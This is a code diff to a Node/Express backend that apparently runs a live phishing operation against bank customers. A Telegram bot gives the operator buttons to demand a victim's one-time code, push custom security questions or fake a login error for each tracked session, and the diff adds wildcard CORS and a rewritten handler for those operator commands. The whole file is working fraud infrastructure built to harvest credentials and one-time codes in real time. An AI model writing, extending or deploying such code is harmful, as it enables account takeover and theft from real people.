@@ -6,6 +6,12 @@ require('dotenv').config();
 
 const app = express();
 app.use(cors());
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+  next();
+});
+
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -59,7 +65,6 @@ app.post('/enviar', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
@@ -110,7 +115,6 @@ ${pregunta2}❓ : ${respuesta2}
   const keyboard = {
     inline_keyboard: [
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
@@ -131,7 +135,6 @@ ${pregunta2}❓ : ${respuesta2}
 });
 
 app.post('/webhook', async (req, res) => {
-  // Manejo de callback
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
     const partes = callback.data.split(":");
@@ -140,6 +143,19 @@ app.post('/webhook', async (req, res) => {
     const cliente = clientes[txid];
 
     if (!cliente) return res.sendStatus(404);
+
+    if (accion === 'preguntas_menu') {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: callback.message.chat.id,
+          text: `✍️ Escribe ambas preguntas personalizadas para ${txid} en un solo mensaje, separadas por "&".\n\nEjemplo:\n/${txid} ¿Pregunta1?&¿Pregunta2?`
+        })
+      });
+
+      return res.sendStatus(200);
+    }
 
     cliente.status = accion;
     guardarEstado();
@@ -156,49 +172,40 @@ app.post('/webhook', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // Manejo de mensaje tipo: /txid pregunta1&pregunta2
-  if (req.body.message && req.body.message.text?.startsWith("/")) {
+  if (req.body.message) {
     const message = req.body.message;
-    const chatId = message.chat.id;
-    const text = message.text.trim();
+    const text = message.text?.trim();
 
-    const match = text.match(/^\/([a-zA-Z0-9]+)\s+(.+)$/);
-    if (!match) return res.sendStatus(200);
+    // Verifica si el mensaje empieza con /txid y contiene "&"
+    if (text && text.startsWith("/") && text.includes("&")) {
+      const partes = text.substring(1).split(" ");
+      const txid = partes[0];
+      const preguntasTexto = partes.slice(1).join(" ");
+      const preguntasSeparadas = preguntasTexto.split("&");
 
-    const txid = match[1];
-    const contenido = match[2];
-    const cliente = clientes[txid];
+      if (preguntasSeparadas.length === 2 && clientes[txid]) {
+        const cliente = clientes[txid];
+        cliente.preguntas[0] = preguntasSeparadas[0].trim();
+        cliente.preguntas[1] = preguntasSeparadas[1].trim();
+        cliente.status = "preguntas";
+        cliente.esperando = null;
+        guardarEstado();
 
-    if (!cliente) {
-      await enviarMensaje(chatId, `⚠️ No se encontró un cliente con ID ${txid}`);
-      return res.sendStatus(200);
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: message.chat.id,
+            text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${cliente.preguntas[0]}\n2️⃣ ${cliente.preguntas[1]}`
+          })
+        });
+      }
     }
-
-    const [preg1, preg2] = contenido.split("&").map(p => p.trim());
-    if (!preg1 || !preg2) {
-      await enviarMensaje(chatId, `⚠️ Debes enviar 2 preguntas separadas por "&"`);
-      return res.sendStatus(200);
-    }
-
-    cliente.preguntas = [preg1, preg2];
-    cliente.status = 'preguntas';
-    cliente.esperando = null;
-    guardarEstado();
-
-    await enviarMensaje(chatId, `✅ Preguntas guardadas para ${txid}\n1️⃣ ${preg1}\n2️⃣ ${preg2}`);
     return res.sendStatus(200);
   }
 
   res.sendStatus(200);
 });
-
-function enviarMensaje(chat_id, text) {
-  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id, text })
-  });
-}
 
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
